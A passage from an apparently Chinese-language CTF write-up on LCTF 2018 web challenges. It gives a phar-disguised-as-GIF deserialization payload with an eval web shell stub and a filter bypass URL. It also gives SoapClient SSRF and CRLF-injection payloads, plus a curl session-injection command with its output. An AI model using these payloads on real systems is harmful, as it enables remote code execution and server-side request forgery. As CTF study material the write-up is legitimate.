class="line">    $data = $_COOKIE[&quot;session-data&quot;]; </span><br><span class="line">    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); </span><br><span class="line">    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; </span><br><span class="line">        die(&quot;Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    if ( !hash_equals(hash_hmac(&quot;md5&quot;, $data, $SECRET), $hmac) )&#123; </span><br><span class="line">        die(&quot;Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line"></span><br><span class="line">    if ( !isset($data-&gt;avatar) )&#123; </span><br><span class="line">        die(&quot;Bye Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    return $data-&gt;avatar;                                                </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($path) &#123; </span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123; </span><br><span class="line">         if(preg_match(&apos;/^(http|https).*/i&apos;, $_GET[&apos;url&apos;]))&#123; </span><br><span class="line">            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                     </span><br><span class="line">            if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123; </span><br><span class="line">                die(&quot;Fuck off&quot;); </span><br><span class="line">            &#125; </span><br><span class="line">            file_put_contents($path . &quot;/avatar.gif&quot;, $data); </span><br><span class="line">            die(&quot;Upload OK&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Hacker&quot;); </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        die(&quot;Miss the URL~~&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function show($path) &#123; </span><br><span class="line">    if ( !is_dir($path) || !file_exists($path . &quot;/avatar.gif&quot;)) &#123; </span><br><span class="line"></span><br><span class="line">        $path = &quot;/var/www&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    header(&quot;Content-Type: image/gif&quot;); </span><br><span class="line">    die(file_get_contents($path . &quot;/avatar.gif&quot;));                      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check($path)&#123; </span><br><span class="line">    if(isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">        if(preg_match(&apos;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i&apos;,$_GET[&apos;c&apos;]))&#123; </span><br><span class="line">            die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            $file_path = $_GET[&apos;c&apos;]; </span><br><span class="line">            list($width, $height, $type) = @getimagesize($file_path); </span><br><span class="line">            die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">                &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;); </span><br><span class="line">        die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">            &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function move($source_path,$dest_name)&#123; </span><br><span class="line">    global $FILEBOX; </span><br><span class="line">    $dest_path = $FILEBOX . &quot;/&quot; . $dest_name; </span><br><span class="line">    if(preg_match(&apos;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&apos;,$source_path))&#123; </span><br><span class="line">        die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        if(copy($source_path,$dest_path))&#123; </span><br><span class="line">            die(&quot;Successful copy&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Copy failed&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$mode = $_GET[&quot;m&quot;]; </span><br><span class="line"></span><br><span class="line">if ($mode == &quot;upload&quot;)&#123; </span><br><span class="line">     upload(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;show&quot;)&#123; </span><br><span class="line">    show(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;check&quot;)&#123; </span><br><span class="line">    check(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if($mode == &quot;move&quot;)&#123; </span><br><span class="line">    move($_GET[&apos;source&apos;],$_GET[&apos;dest&apos;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">include(&quot;./comments.html&quot;);</span><br></pre></td></tr></table></figure>
+<h3 id="上传文件-1"><a href="#上传文件-1" class="headerlink" title="上传文件"></a>上传文件</h3><p><code>getimagesize($file_path)</code> 可以触发反序列化</p>
+<p>生成一个伪装成gif的phar文件上传即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class K0rz3n_secret_flag &#123; </span><br><span class="line">    protected $file_path = &apos;/var/www/data/dccb75e38fe3fc2c70fd169f263e6d37/avatar.gif&apos;;  </span><br><span class="line">&#125; </span><br><span class="line">$a = new K0rz3n_secret_flag();</span><br><span class="line">$phar = new Phar(&apos;test.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&apos;GIF89a&lt;?php echo 1;eval($_GET[&quot;a&quot;]);?&apos;.&apos;&gt;&lt;?php __HALT_COMPILER(); ?&apos;.&apos;&gt;&apos;);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>访问:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://212.64.7.171/LCTF.php?m=check&amp;c=compress.zlib://phar:///var/www/data/dccb75e38fe3fc2c70fd169f263e6d37/avatar.gif&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
+<p><code>compress.zlib</code>用于绕过<code>^phar</code>检测。</p>
+<h2 id="EZ-oauth"><a href="#EZ-oauth" class="headerlink" title="EZ oauth"></a>EZ oauth</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>使用<code>Oauth</code>登录，采用第三方<code>TYPCN</code>，<code>&lt;https://accounts.typcn.com/&gt;</code></p>
+<h3 id="注册登录"><a href="#注册登录" class="headerlink" title="注册登录"></a>注册登录</h3><p><img src="/assets/lctf/TIM截图20181119212854.png" alt=""></p>
+<p>参考Google CTF 2016的题解，猜测它只判断<code>includes(&#39;pwnhub.cn&#39;)</code>而不是<code>equal(&#39;pwnhub.cn&#39;)</code>，因此搞个域名邮箱绕过邮箱验证。</p>
+<p>后台发现有个两个接口，分别是<code>/user/check</code>和<code>/admin/auth</code>。后者没参数，前者的参数分别为<code>domain</code>和<code>email</code>，且<code>domain</code>为隐藏参数。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181119125336-12c530e2-ebb7-1.png" rel="external nofollow" target="_blank"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181119125336-12c530e2-ebb7-1.png" alt="img"></a></p>
+<p>猜测其为验证服务器，将其改为自己的服务器，得知服务器发送数据；再本地模拟一下，得知服务器返回信息。发现这里有个极度麻烦的sign签名验证，经过测试，其至少和<code>request-id</code>和<code>email</code>存在关联。因此，我们很难修改回包。因为没有任何可控数据，也无法进行哈希长度扩展攻击。另外，我们发现<code>/admin/auth</code>也有一个隐藏的<code>domain</code>参数，其除了请求API以外，发送的数据和接受的数据与<code>/user/check</code>相同。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181119125338-1430e7c8-ebb7-1.png" rel="external nofollow" target="_blank"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181119125338-1430e7c8-ebb7-1.png" alt="img"></a></p>
+<p>既然签名算法无法逆向，那只能进行大胆猜测了。我们不知道<code>result</code>参数是否有在被签名的范围之内，如果它没有呢？</p>
+<p>揭示了一个黄金原则：未将关键参数纳入签名范围内的签名 = 废纸</p>
+<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>参考链接: <a href="https://www.anquanke.com/post/id/164569#h3-7" rel="external nofollow" target="_blank">https://www.anquanke.com/post/id/164569#h3-7</a></p>
+<p>​         <a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" rel="external nofollow" target="_blank">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<p>index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure>
+<p>flag.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">    $flag = &apos;LCTF&#123;*************************&#125;&apos;;</span><br><span class="line">    if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">           $_SESSION[&apos;flag&apos;] = $flag;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用soap触发ssrf"><a href="#利用soap触发ssrf" class="headerlink" title="利用soap触发ssrf"></a>利用soap触发ssrf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(location&apos;=&gt;&apos;http://example.com:2333&apos;,&apos;uri&apos;=&gt;&apos;123&apos;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure>
+<p><img src="/assets/lctf/TIM截图20181120104635.png" alt=""></p>
+<h3 id="设置user-agent头来构造CRLF"><a href="#设置user-agent头来构造CRLF" class="headerlink" title="设置user_agent头来构造CRLF"></a>设置user_agent头来构造CRLF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://example.com:2333/&quot;;</span><br><span class="line">$post_string = &apos;data=abc&apos;;</span><br><span class="line">$headers = array(</span><br><span class="line">    &apos;X-Forwarded-For: 127.0.0.1&apos;,</span><br><span class="line">    &apos;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&apos;</span><br><span class="line">);</span><br><span class="line">$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target,&apos;user_agent&apos;=&gt;&apos;wupco^^Content-Type: application/x-www-form-urlencoded^^&apos;.join(&apos;^^&apos;,$headers).&apos;^^Content-Length: &apos;. (string)strlen($post_string).&apos;^^^^&apos;.$post_string,&apos;uri&apos;=&gt;&apos;hello&apos;));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(&apos;^^&apos;,&quot;\n\r&quot;,$aaa);</span><br><span class="line">echo urlencode($aaa);</span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure>
+<p><img src="/assets/lctf/TIM截图20181120105957.png" alt=""></p>
+<h3 id="payload-php"><a href="#payload-php" class="headerlink" title="payload.php"></a>payload.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $target = &quot;http://127.0.0.1/best_lctf/flag.php&quot;;</span><br><span class="line">3 $attack = new SoapClient(null,array(&apos;location&apos; =&gt; $target,</span><br><span class="line">4                               &apos;user_agent&apos; =&gt; &quot;N0rth3ty\r\nCookie: PHPSESSID=a0    sdtk0pk3gcf2jovjskkcp0n6\r\n&quot;,</span><br><span class="line">5                               &apos;uri&apos; =&gt; &quot;123&quot;));</span><br><span class="line">6 $payload = urlencode(serialize($attack));</span><br><span class="line">7 echo $payload;</span><br></pre></td></tr></table></figure>
+<h3 id="将payload写入某个session5rtososkghp97ud5fgupgpk014"><a href="#将payload写入某个session5rtososkghp97ud5fgupgpk014" class="headerlink" title="将payload写入某个session5rtososkghp97ud5fgupgpk014"></a>将payload写入某个session<code>5rtososkghp97ud5fgupgpk014</code></h3><p>通过session_start将<code>serialize_handler</code>设置为<code>php_serialize</code>，同时将name设置为<code>|&lt;payload&gt;</code>这样的格式，写入session<code>5rtososkghp97ud5fgupgpk014</code>.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/lctf$ curl -v -d "serialize_handler=php_serialize" "http://192.168.21.143/best_lctf/index.php?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A35%3A%22http%3A%2F%2F127.0.0.1%2Fbest_lctf%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Da0sdtk0pk3gcf2jovjskkcp0n6%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D"</span><br><span class="line">*   Trying 192.168.21.143...</span><br><span class="line">* Connected to 192.168.21.143 (192.168.21.143) port 80 (#0)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> POST /best_lctf/index.php?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A35%3A%22http%3A%2F%2F127.0.0.1%2Fbest_lctf%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Da0sdtk0pk3gcf2jovjskkcp0n6%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Host: 192.168.21.143</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> User-Agent: curl/7.47.0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Accept: */*</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Content-Length: 31</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br><span class="line">* upload completely sent off: 31 out of 31 bytes</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Tue, 20 Nov 2018 03:40:43 GMT</span><br><span class="line">&lt; Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">&lt; Set-Cookie: PHPSESSID=5rtososkghp97ud5fgupgpk014; path=/</span><br><span class="line">&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">&lt; Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 2910</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt;</span><br><span class="line">&lt;code&gt;&lt;span style="color: #000000"&gt;</span><br><span class="line">&lt;span style="color: #0000BB"&gt;&amp;lt;?php&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;__FILE__&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$b&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'implode'&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;call_user_func&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #0000BB"&gt;f&lt;/span&gt;&lt;span style="color: #007700"&gt;],&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;session_start&lt;/span&gt;&lt;span style="color: #007700"&gt;();&lt;br /&gt;if(isset(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #0000BB"&gt;name&lt;/span&gt;&lt;span style="color: #007700"&gt;]))&#123;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_SESSION&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #0000BB"&gt;name&lt;/span&gt;&lt;span style="color: #007700"&gt;]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #0000BB"&gt;name&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&#125;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;var_dump&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_SESSION&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$a&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;array(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;reset&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_SESSION&lt;/span&gt;&lt;span style="color: #007700"&gt;),&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'welcome_to_the_lctf2018'&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;var_dump&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$a&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;call_user_func&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$b&lt;/span&gt;&lt;span style="color: #007700"&gt;,&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$a&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_SESSION);</span></span><br><span class="line">array(1) &#123;</span><br><span class="line">  ["name"]=&gt;</span><br><span class="line">  string(236) "|O:10:"SoapClient":5:&#123;s:3:"uri";s:3:"123";s:8:"location";s:35:"http://127.0.0.1/best_lctf/flag.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:56:"N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=a0sdtk0pk3gcf2jovjskkcp0n6</span><br><span class="line">";s:13:"_soap_version";i:1;&#125;"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">a = array(reset(<span class="variable">$arrayName</span>), <span class="string">'welcome_to_the_lctf'</span>);</span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a);</span></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(236) "|O:10:"SoapClient":5:&#123;s:3:"uri";s:3:"123";s:8:"location";s:35:"http://127.0.0.1/best_lctf/flag.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:56:"N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=a0sdtk0pk3gcf2jovjskkcp0n6</span><br><span class="line">";s:13:"_soap_version";i:1;&#125;"</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(23) "welcome_to_the_lctf2018"</span><br><span class="line">&#125;</span><br><span class="line">* Connection #0 to host 192.168.21.143 left intact</span><br></pre></td></tr></table></figure>
+<h3 id="php-serialize引擎反序列化"><a href="#php-serialize引擎反序列化" class="headerlink" title="php_serialize引擎反序列化"></a>php_serialize引擎反序列化</h3><p>php序列化引擎,而不同引擎存储的方式也不同</p>
+<ul>
+<li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
+<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
+<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
+</ul>
+<p><strong>session.serialize_handler定义用来序列化／解序列化的处理器名字。 当前支持 PHP 序列化格式 (名为 <em>php_serialize</em>)、 PHP 内部格式 (名为 <em>php</em> 及 <em>php_binary</em>) 和 WDDX (名为 <em>wddx</em>)。 如果 PHP 编译时加入了 <a href="http://php.net/manual/zh/ref.wddx.php" rel="external nofollow" target="_blank">WDDX 支持</a>，则只能用 WDDX。 自 PHP 5.5.4 起可以使用 <em>php_serialize</em>。 <em>php_serialize</em> 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 <em>php</em> 和 <em>php_binary</em> 所具有的限制。 使用较旧的序列化处理器导致 $_SESSION 的索引既不能是数字也不能包含特殊字符(<em>|</em> and <em>!</em>) 。 使用 <em>php_serialize</em> 避免脚本退出时，数字及特殊字符索引导致出错。 默认使用 <em>php</em>。</strong></p>
+<p>php引擎去解php_serialize得到的序列化会出现如下问题:</p>
+<p>php引擎会以|作为作为key和value的分隔符，我们再传入内容的时候，比如传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[‘name’] = &apos;|sky&apos;</span><br><span class="line">结果:</span><br><span class="line">name|s:3:”sky”</span><br></pre></td></tr></table></figure>
+<p>那么使用php_serialize引擎时可以得到序列化内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:”name”;s:4:”|sky”;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用php引擎反序列化时，|被当做分隔符，于是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:”name”;s:4:” 被当做key      sky被当做value进行反序列化</span><br></pre></td></tr></table></figure>
+<p>构造如下payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[‘name’] = |序列化内容</span><br></pre></td></tr></table></figure>
+<p>首先通过<code>extract</code>变量覆盖，将b设置为<code>call_user_func</code>。</p>
+<p>同时，使用php_serialize引擎反序列化之后得到如下数据:</p>
+<p><img src="/assets/lctf/t01f1c17eaf55f62f7b.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_SESSION);</span><br><span class="line">结果:</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;a:1:&#123;s:4:&quot;name&quot;;s:236:&quot;&quot;]=&gt;</span><br><span class="line">  object(SoapClient)#1 (5) &#123;</span><br><span class="line">    [&quot;uri&quot;]=&gt;</span><br><span class="line">    string(3) &quot;123&quot;</span><br><span class="line">    [&quot;location&quot;]=&gt;</span><br><span class="line">    string(35) &quot;http://127.0.0.1/best_lctf/flag.php&quot;</span><br><span class="line">    [&quot;_stream_context&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;_user_agent&quot;]=&gt;</span><br><span class="line">    string(56) &quot;N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=a0sdtk0pk3gcf2jovjskkcp0n6</span><br><span class="line">&quot;</span><br><span class="line">    [&quot;_soap_version&quot;]=&gt;</span><br><span class="line">    int(1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = array(reset($arrayName), &apos;welcome_to_the_lctf&apos;);</span><br><span class="line">var_dump($a);</span><br><span class="line">结果:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  object(SoapClient)#1 (5) &#123;</span><br><span class="line">    [&quot;uri&quot;]=&gt;</span><br><span class="line">    string(3) &quot;123&quot;</span><br><span class="line">    [&quot;location&quot;]=&gt;</span><br><span class="line">    string(35) &quot;http://127.0.0.1/best_lctf/flag.php&quot;</span><br><span class="line">    [&quot;_stream_context&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;_user_agent&quot;]=&gt;</span><br><span class="line">    string(56) &quot;N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=a0sdtk0pk3gcf2jovjskkcp0n6</span><br><span class="line">&quot;</span><br><span class="line">    [&quot;_soap_version&quot;]=&gt;</span><br><span class="line">    int(1)</span><br><span class="line">  &#125;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  